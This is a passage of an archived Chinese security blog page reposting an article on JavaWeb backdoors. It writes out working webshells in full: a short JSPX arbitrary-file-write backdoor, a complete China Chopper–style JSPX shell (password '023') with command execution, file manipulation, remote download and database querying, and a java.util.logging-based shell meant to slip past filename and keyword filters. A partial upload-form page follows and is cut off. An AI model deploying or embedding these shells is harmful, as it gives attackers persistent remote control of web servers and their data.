@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>攻击JavaWeb应用 8]-后门篇 | Blog of Secer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="攻击JavaWeb应用[8]-后门篇  0x00 背景    关于JavaWeb 后门 问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。  0x01 jspx 后门&amp;#160;    在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击JavaWeb应用 8]-后门篇">
+<meta property="og:url" content="http://id.cker.in/1043.seo/index.html">
+<meta property="og:site_name" content="Blog of Secer">
+<meta property="og:description" content="攻击JavaWeb应用[8]-后门篇  0x00 背景    关于JavaWeb 后门 问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。  0x01 jspx 后门&amp;#160;    在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image001_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image002_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image003_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image004_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image005_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image006_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image007_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image008_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image009_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image011_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image013_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image015_thumb.png">
+<meta property="og:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image017_thumb.png">
+<meta property="og:updated_time" content="2016-08-17T15:07:37.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="攻击JavaWeb应用 8]-后门篇">
+<meta name="twitter:description" content="攻击JavaWeb应用[8]-后门篇  0x00 背景    关于JavaWeb 后门 问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。  0x01 jspx 后门&amp;#160;    在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配">
+<meta name="twitter:image" content="http://img.cker.in/JavaWeb8_9E52/clip_image001_thumb.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Blog of Secer" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Blog of Secer</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Søk"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://id.cker.in"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-1043" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/1043.seo/" class="article-date">
+  <time datetime="2013-10-21T21:09:36.000Z" itemprop="datePublished">2013-10-22</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/category/Web安全/">Web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      攻击JavaWeb应用 8]-后门篇
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4><a href="http://drops.wooyun.org/tips/662" target="_blank" rel="external">攻击JavaWeb应用[8]-后门篇</a></h4>  <h4>0x00 背景</h4>  <hr align="left" width="100%" noshade="noshade" size="2">  <p>关于JavaWeb <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a> 问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。</p>  <h4>0x01 jspx <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a>&#160;</h4>  <hr align="left" width="100%" noshade="noshade" size="2">  <p>在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配置文件的时候看到jsp和jspx都是由org.apache.jasper.servlet.JspServlet处理，于是想构建一个jspx的webshell。经过反复的折腾，一个jspx的后门就粗线了。测试应该是java的所有的server都默认支持。</p>  <h5>Tomcat默认的conf/web.xml下的配置：</h5>  <pre><code>&#160;&#160; &lt;servlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;fork&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;load-on-startup&gt;3&lt;/load-on-startup&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet&gt;</code></pre><br><br><pre><code>&#160;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;servlet-mapping&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;<em>.jsp&lt;/url-pattern&gt;</em></code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;.jspx&lt;/url-pattern&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet-mapping&gt;</code></pre><br><br><p>关于jspx的资料网上并不多，官网给的文档也不清楚，搞的模模糊糊的。怎么去玩jspx大家可以看下官网的demo，或者参考一些文章。</p><br><br><p><a href="http://jspx-bay.sourceforge.net/" target="_blank" rel="external">http://jspx-bay.sourceforge.net</a></p><br><br><p>关于jspx文件的一些说明：</p><br><br><p><a href="http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html</a></p><br><br><p>重点在于把Jsp里面的一些标记转换成xml支持的格式，比如：</p><br><br><pre><code>&lt;%@ include .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.include .. /&gt;</code></pre><br><br><pre><code> &lt;%@ page .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.page .. /&gt;</code></pre><br><br><pre><code>&lt;%@ taglib .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; xmlns:prefix=&quot;tag library URL&quot;</code></pre><br><br><pre><code>&lt;%= ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:expression&gt; .. &lt;/jsp:expression&gt;</code></pre><br><br><pre><code>&lt;% ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:scriptlet&gt; .. &lt;/jsp:scriptlet&gt;</code></pre><br><br><p>知道&lt;% %&gt;可以用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>标记表示那么做起来就很简单了，直接把标记换下是非常容易做的。所以写个简单的shell一个就很简单了，但是如果想知道具体有那些标签或者说跟jsp里面的有那些不同怎么办呢？下面我简单的做了下对比（前面是jsp的代码提示，后面是jspx）：</p><br><br><p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image001.jpg" target="_blank" rel="external"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="353" alt="clip_image001" src="http://img.cker.in/JavaWeb8_9E52/clip_image001_thumb.jpg" width="392" border="0"></a></p><br><br><p>照着提示翻译下得知表示jsp里面的&lt;%! %&gt;需要用：<code>&lt;jsp:declaration&gt;&lt;/jsp:declaration&gt;</code>标签去替换就行了。</p><br><br><h5>其他重要提醒：</h5><br><br><p>在jspx里面遵循xml语法所以直接在jsp:declaration或者jsp:scriptlet标签内写&quot;&lt;&gt;&quot;这样的符号是不行的，需要转意（不转意会报编译错误，猜了下只需要把&lt;&gt;转成<code>&amp;lt;&#160;&#160; &amp;gt;</code>就行了）。</p><br><br><h5>jspx后门的具体实现代码：</h5><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:root xmlns:jsp=&quot;<a href="http://java.sun.com/JSP/Page&amp;quot" target="_blank" rel="external">http://java.sun.com/JSP/Page&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns=&quot;<a href="http://www.w3.org/1999/xhtml&amp;quot" target="_blank" rel="external">http://www.w3.org/1999/xhtml&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns:c=&quot;<a href="http://java.sun.com/jsp/jstl/core&amp;quot" target="_blank" rel="external">http://java.sun.com/jsp/jstl/core&amp;quot</a>; version=&quot;1.2&quot;&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page import=&quot;java.io.<em>&quot; /&gt;</em></code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:scriptlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; RandomAccessFile rf = new RandomAccessFile(request.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;), &quot;rw&quot;);</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.write(request.getParameter(&quot;t&quot;).getBytes());</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.close();</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/jsp:scriptlet&gt;</code></pre><br><br><pre><code>&lt;/jsp:root&gt;</code></pre><br><a id="more"></a><br><pre><code></code></pre><br><br><h5>jspx实现的我之前发的<a href="http://Ha.Cker.In/tag/菜刀" target="_blank">菜刀</a>最终版：</h5><br><br><p><a href="http://localhost:8080/jspx.jspx" target="_blank" rel="external">http://localhost:8080/jspx.jspx</a> ￼ 直接用菜刀连接：</p><br><br><p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image002.jpg" target="_blank" rel="external"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="509" alt="clip_image002" src="http://img.cker.in/JavaWeb8_9E52/clip_image002_thumb.jpg" width="806" border="0"></a></p><br><br><pre><code>&lt;jsp:root xmlns:jsp=&quot;<a href="http://java.sun.com/JSP/Page&amp;quot" target="_blank" rel="external">http://java.sun.com/JSP/Page&amp;quot</a>; xmlns=&quot;<a href="http://www.w3.org/1999/xhtml&amp;quot" target="_blank" rel="external">http://www.w3.org/1999/xhtml&amp;quot</a>; xmlns:c=&quot;<a href="http://java.sun.com/jsp/jstl/core&amp;quot" target="_blank" rel="external">http://java.sun.com/jsp/jstl/core&amp;quot</a>; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;&lt;jsp:directive.page import=&quot;java.io.&quot;/&gt;&lt;jsp:directive.page import=&quot;java.util.<em>&quot;/&gt;&lt;jsp:directive.page import=&quot;java.net.</em>&quot;/&gt;&lt;jsp:directive.page import=&quot;java.sql.<em>&quot;/&gt;&lt;jsp:directive.page import=&quot;java.text.</em>&quot;/&gt;&lt;jsp:declaration&gt;String Pwd=&quot;023&quot;;String cs=&quot;UTF-8&quot;;String EC(String s)throws Exception{return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim());if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1){return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);if(x.length&gt;4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&amp;lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0; i&amp;lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ +=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory()){sb.append(l[i].getName()+&quot;/\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;);}else{sF+=l[i].getName()+&quot;\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;;}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k &amp;lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((&quot;|&quot;+&quot;&amp;lt;-&quot;).getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h=&quot;0123456789ABCDEF&quot;;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&amp;lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &amp;lt;&amp;lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j&amp;lt;z.length; j++){HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+&quot;\t&quot;);}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split(&quot;\r\n&quot;);ResultSet r=c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null,&quot;%&quot;,new String[]{&quot;TABLE&quot;});while(r.next()){sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\t&quot;);}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&amp;lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\t&quot;);}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(&quot;–f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;–f:&quot;)):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &amp;lt;=n; i++){sb.append(d.getColumnName(i)+&quot;\t|\t&quot;);}sb.append(&quot;\r\n&quot;);if(q.indexOf(&quot;–f:&quot;)!=-1){File file=new File(p);if(q.indexOf(&quot;-to:&quot;)==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;–f:&quot;)+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i&amp;lt;=n;i++){if(q.indexOf(&quot;–f:&quot;)!=-1){bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);bw.flush();}else{sb.append(r.getObject(i)+&quot;&quot;+&quot;\t|\t&quot;);}}if(bw!=null){bw.newLine();}sb.append(&quot;\r\n&quot;);}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(&quot;Result\t|\t\r\n&quot;);try{m.executeUpdate(q);sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);}catch(Exception ee){sb.append(ee.toString()+&quot;\t|\t\r\n&quot;);}}m.close();c.close();}&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;cs=request.getParameter(&quot;z0&quot;)!=null?request.getParameter(&quot;z0&quot;)+&quot;&quot;:cs;response.setContentType(&quot;text/html&quot;);response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try{String Z=EC(request.getParameter(Pwd)+&quot;&quot;);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;);sb.append(&quot;-&gt;&quot;+&quot;|&quot;);String s=request.getSession().getServletContext().getRealPath(&quot;/&quot;);if(Z.equals(&quot;A&quot;)){sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;)){AA(sb);}}else if(Z.equals(&quot;B&quot;)){BB(z1,sb);}else if(Z.equals(&quot;C&quot;)){String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}br.close();}else if(Z.equals(&quot;D&quot;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);}else if(Z.equals(&quot;E&quot;)){EE(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;F&quot;)){FF(z1,response);}else if(Z.equals(&quot;G&quot;)){GG(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;H&quot;)){HH(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;I&quot;)){II(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;J&quot;)){JJ(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;K&quot;)){KK(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;L&quot;)){LL(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;M&quot;)){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(&quot;N&quot;)){NN(z1,sb);}else if(Z.equals(&quot;O&quot;)){OO(z1,sb);}else if(Z.equals(&quot;P&quot;)){PP(z1,sb);}else if(Z.equals(&quot;Q&quot;)){QQ(cs,z1,z2,sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\&quot;,&quot;/&quot;)+&quot;images/&quot;);}}catch(Exception e){sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());}sb.append(&quot;|&quot;+&quot;&amp;lt;-&quot;);out.print(sb.toString());&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</code></pre><br><br><h4>0x02 Java Logger日志后门</h4>
+
+<hr align="left" width="100%" noshade="noshade" size="2">
+
+<p>某些场景下shell可能被过滤掉了，但是利用一些有趣的东东可以绕过，比如不用new File这样的方式去写文件，甚至是尽可能的不要出现File关键字。</p>
+
+<p>看了下java.util.logging.Logger挺有意思的，可以写日志文件，于是试了下用这样的方式去写一个shell，结果成功了。</p>
+
+<p>java.util.logging.Logger默认输出的格式是xml，但这都不是事，直接格式化下日志以text方式输出就行了。</p>
+
+<p>新建2.jsp并访问：</p>
+
+<pre><code>&lt;%java.util.logging.Logger l=java.util.logging.Logger.getLogger(&quot;t&quot;);java.util.logging.FileHandler h=new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;),true);h.setFormatter(new java.util.logging.SimpleFormatter());l.addHandler(h);l.info(request.getParameter(&quot;t&quot;));%&gt;</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image003.jpg" target="_blank" rel="external"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="406" alt="clip_image003" src="http://img.cker.in/JavaWeb8_9E52/clip_image003_thumb.jpg" width="832" border="0"></a></p>
+
+<h5>其他略特殊点的文件读写Demo：</h5>
+
+<pre><code>new FileOutputStream </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; new FileOutputStream(&quot;d:/sb.txt&quot;).write(new String(&quot;123&quot;).getBytes()); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; new DataOutputStream </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; new DataOutputStream(new FileOutputStream(&quot;d:/1x.txt&quot;)).write(new String(&quot;123&quot;).getBytes()); </code></pre>
+
+<pre><code>FileWriter fw = new FileWriter(&quot;d:/3.txt&quot;); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fw.write(&quot;21&quot;); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fw.flush(); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fw.close(); </code></pre>
+
+<pre><code>RandomAccessFile rf = new RandomAccessFile(&quot;d:/14.txt&quot;, &quot;rw&quot;); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.write(new String(&quot;3b&quot;).getBytes()); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.close();</code></pre>
+
+<h5>GetShell.htm: </h5>
+
+<pre><code>&lt;html&gt; </code></pre>
+
+<pre><code>&lt;head&gt; </code></pre>
+
+<pre><code>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; </code></pre>
+
+<pre><code>&lt;title&gt;jsp-yzmm&lt;/title&gt; </code></pre>
+
+<pre><code>&lt;/head&gt; </code></pre>
+
+<pre><code>&lt;style&gt; </code></pre>
+
+<pre><code>.main{width:980px;height:600px;margin:0 auto;} </code></pre>
+
+<pre><code>.url{width:300px;} </code></pre>
+
+<pre><code>.fn{width:80px;} </code></pre>
+
+<pre><code>.content{width:80%;height:60%;} </code></pre>
+
+<pre><code>&lt;/style&gt; </code></pre>
+
+<pre><code>&lt;script&gt; </code></pre>
+
+<pre><code>&#160; function upload(){ </code></pre>
+
+<pre><code>&#160;&#160;&#160; var url = document.getElementById('url').value, </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; content = document.getElementById('content').value, </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; fileName = document.getElementById('fn').value, </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; form = document.getElementById('fm'); </code></pre>
+
+<pre><code>&#160;&#160;&#160; if(url.length == 0){ </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; alert(&quot;Url not allowd empty!&quot;); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; return ; </code></pre>
+
+<pre><code>&#160;&#160;&#160; } </code></pre>
+
+<pre><code>&#160;&#160;&#160; if(content.length == 0){ </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; alert(&quot;Content not allowd empty!&quot;); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; return ; </code></pre>
+
+<pre><code>&#160;&#160;&#160; } </code></pre>
+
+<pre><code>&#160;&#160;&#160; if(fileName.length == 0){ </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; alert(&quot;FileName not allowd empty!&quot;); </code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160; return ; </code></pre>
+
+<pre><code>&#160;&#160;&#160; } </code></pre>
+
+<pre><code>&#160;&#160;&#160; form.action = url; </code></pre>
+
+<pre><code>&#160;&#160;&#160; form.submit(); </code></pre>
+
+<pre><code>&#160; } </code></pre>
+
+<pre><code>&lt;/script&gt; </code></pre>
+
+<pre><code>&lt;body&gt; </code></pre>
+
